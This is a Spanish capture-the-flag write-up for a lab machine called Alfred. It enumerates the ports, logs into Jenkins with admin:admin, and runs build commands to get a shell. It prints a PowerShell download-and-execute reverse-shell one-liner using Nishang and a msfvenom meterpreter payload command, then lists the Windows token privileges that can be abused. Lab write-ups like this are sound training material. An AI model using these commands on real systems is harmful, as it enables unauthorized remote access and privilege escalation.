# ALFRED

# INTRODUCCIÓN

En esta máquina, nos centraremos en explotar una mala configuración de un servidor automatizado (Jenkins- Es una herramienta que se utiliza para crear integraciones contunias para desarrolladores, automaticamente suben o cambian código a la misma plataforma)

Esto esta en una aplciación web, usaremos "Nishang" para ganar acceso. El repositorio contendra scripts utiles para ganar acceso, enumerar y escalar privilegios, en este caso usaremos scripts de rev shell.

# ENUMERACIÓN

Escaneo de puertos

![image](https://github.com/user-attachments/assets/ee01d017-3252-4bf6-9274-0ade4499d697)

Nos encontramos con:

Puerto 80 abierto con una web en Microsoft ISS 

![image](https://github.com/user-attachments/assets/c71c996b-d60a-461c-8cee-08db34284830)

Nos encontramos también el puerto 3389 abierto

El puerto 8080 con otro http con "Jetty 9.4.z-SNAPSHOT"

Antes de conectarnos he probado a ver si habia escondido algo dentro de la imagen del puerto 80 pero no 

Si nos conectamos al 8080 encontramos un "Jenkins"

![image](https://github.com/user-attachments/assets/4d113a46-85f9-4189-948b-d772044a0ed0)

Después de probar bastantes convinaciones el usuario y contraseña de jenkins es fácilisimo

admin:admin 

Ahora deberemos encontrar algun lugar en el que podamos ejecutar comandos. Cuando encontremos dicha herramienta podemos usar una revershe shell para nuestra ip

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

Primero de todo la versión : "Jenkins ver. 1.190.1"

Buscamos un exploit de dicha version

Buscamos la consola: 

ip/job/project/1/console

![image](https://github.com/user-attachments/assets/c2d74423-5571-4d4b-b496-3be2fc989c80)

## REVSHELL

Usando nishang "PowerShell.ps1" crearemos dicha shell

https://github.com/samratashok/nishang.git

Cogemos el archivo "Invoke-PowerShelltcp.ps1" y abrimos un python -m htpp.server

![image](https://github.com/user-attachments/assets/60dc0ee4-79c4-4b9e-adf2-052539bd5508)

Abrimos también un listener en el puerto que queramos y añadimos el comando que hemos puesto detro del jenkins

Aquí todos los putos write ups los explican muy mal, simplemente te metes al pojecta ya esxistente y le das a configurar dentro te vas abajo donde pone build y veras un "whoami" y poner el comando refiriendose al nombre del archivo que le has puesto.

![image](https://github.com/user-attachments/assets/1d3685fd-505a-4318-a638-fef75f6a120c)

![image](https://github.com/user-attachments/assets/54aedf20-1ed8-4678-bd3c-8cd96ff9b55b)

Estamos dentro!!!

![image](https://github.com/user-attachments/assets/a582de0c-6764-4a88-8aab-3bf695d55e6a)

# ESCALADA DE PRIVILEGIOS

Vamos a crear un payload con msfvenom

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai EXITFUNC=thread LHOST=10.8.20.45 LPORT=9001 -f exe -o revshell9001exit.exe
```

Después de crear el payload lo descargamos en la máquina con el mismo metodo que anteirormente hemos hecho.

![image](https://github.com/user-attachments/assets/28f91b4d-f756-4ecb-80a0-226ace0240f4)

![image](https://github.com/user-attachments/assets/aaf71b2a-bb14-44c7-901a-d678fc075e7a)

Posteriormente desde msfconsole creamos una sesion con un multi/handler por el puerto que hemos puesto en mi caso el 8999

![image](https://github.com/user-attachments/assets/f2fa45fd-c91f-48d6-b45b-630fb21ad41d)

Desde el windows que estabamos ejecutamos la shell

![image](https://github.com/user-attachments/assets/f62519f1-aeaf-4f24-be4a-0fefaad05a50)

Ya con la shell dentro vamos a ganar acceso root

Windows usa tokens para asegurarse que las cuentas tienen los privilegios que dicen tener. Las cuentas de los tokens estan asiganadas a los usuarios cuando se loguean o identificasn. Usualmente estan en "LSASS.exe"

Consiste en

- Users ID
- Grupos IDS
- Privilegios

Hay dos tipos de atokens de acceso

- Primarios
- Impersonales

Los impersonales se dividen en niveles.

- Anonymous
- Identificacion
- Impersonales
- Delegacion

Mayores abusos de privilegios
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege






